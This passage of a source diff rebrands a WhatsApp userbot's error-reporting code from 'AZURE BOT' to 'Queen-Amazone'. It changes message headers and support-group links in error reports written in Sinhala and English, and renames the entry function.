                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Cannot Decode Text or Media_' +
                                         '\n*🤖හේතුව:* _වැරදි ලෙස භාවිතා කිරීම._' +
@@ -733,7 +748,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('unescaped')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Word Character Usage_' +
                                         '\n*🤖හේතුව:* _English හෝඩියේ පිටත TTP, ATTP වැනි විධානයන් භාවිතා කිරීම._' +
@@ -742,7 +757,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('conversation')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Deleting Plugin_' +
                                         '\n*🤖හේතුව:* ප්ලගීනයෙ නම වැරදියි.._' +
@@ -752,23 +767,23 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                 }
                                 else {
                                     return await conn.sendMessage(conn.user.jid, '*🙇🏻 කණගාටුයි AUTO ERROR පද්ධතියට හදුනාගත නොහැකියි! 🙇🏻*' +
-                                        '\nඔබට පුලුවන් වැඩිදුර උදව් සදහා සහය සමූහයට ලිවීමට..🛡️ https://t.me/azure_support'
+                                        '\n_ඔබට පුලුවන් වැඩිදුර උදව් සදහා සහය සමූහයට ලිවීමට..🛡️ https://t.me/Amazone_Neotrox_Support_'
                                         , MessageType.text
                                     );
                                 }
                             }
                             else {
-                                await conn.sendMessage(conn.user.jid, '*-- Bot Report [🦹🏻‍♂️ AZURE BOT] --*' + 
-                                    '\n*👩‍🦰Queen-Amazone Working Perfectly!*'+
+                                await conn.sendMessage(conn.user.jid, '*-- Bot Report [ ' + awsh.DEVELOPER_TAG +' ] --*' + 
+                                    '\n* ' + awsh.DEVELOPER_TAG +'  Working Perfectly!*'+
                                     '\n_This is Your LOG Number Dont try Command here.!_' +
                                     '\n_Also you can Join our Support group.._' +
-                                    '\n_Support groups_: https://t.me/azure_support' +
+                                    '\n_Support groups_: https://chat.whatsapp.com/GTgqgMTo7FoJ1GqdijshsX 🛡️ https://t.me/Amazone_Neotrox_Support_' +
                                     '\n_(saved Messages)._\n\n' +
                                     '*Error:* ```' + error + '```\n\n'
                                     , MessageType.text, {detectLinks: false}
                                 );
                                 if (error.message.includes('URL')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                         '\n*Reason:* _The usage of media tools (nmedia, sticker..) in the LOG number._' +
@@ -777,7 +792,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('conversation')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Deleting Plugin_' +
                                         '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
@@ -786,7 +801,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('split')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🛡️ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Split of Undefined_' +
                                         '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
@@ -795,7 +810,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('SSL')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _SQL Database Error_' +
                                         '\n*Reason:* _Database corruption._ ' +
@@ -804,7 +819,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('Ookla')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Ookla Server Connection_' +
                                         '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
@@ -813,7 +828,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('params')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Requested Audio Params_' +
                                         '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
@@ -822,7 +837,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('unlink')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS``` ==========' +
                                         '\n\n*Main Error:* _No Such File or Directory_' +
                                         '\n*Reason:* _Incorrect coding of the plugin._' +
@@ -831,7 +846,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('404')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Error 404 HTTPS_' +
                                         '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
@@ -840,7 +855,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('reply.delete')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🛡️ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Reply Delete Function_' +
                                         '\n*Reason:* _Using IMG or Wiki commands._' +
@@ -849,7 +864,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('load.delete')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Reply Delete Function_' +
                                         '\n*Reason:* _Using IMG or Wiki commands._' +
@@ -858,7 +873,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('400')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                         '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
@@ -867,7 +882,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('decode')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                         '\n*Reason:* _Incorrect use of the plug._' +
@@ -876,7 +891,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('unescaped')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                         '\n========== ```🧚‍♂ERROR ANALYSIS!``` ==========' +
                                         '\n\n*Main Error:* _Word Character Usage_' +
                                         '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
@@ -886,7 +901,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                 }
                                 else {
                                     return await conn.sendMessage(conn.user.jid, '*🧚‍♂Sorry, I Couldnt Read This Error!🙇🏻*' +
-                                        '\nYou can write to our support groups for more help...🛡️ https://t.me/azure_support_'
+                                        '\n_You can write to our support groups for more help...🛡️ https://t.me/Amazone_Neotrox_Support_'
                                         , MessageType.text
                                     );
                                }
@@ -913,4 +928,4 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
     }
 }
 
-whatsAsena();
+Amazone();
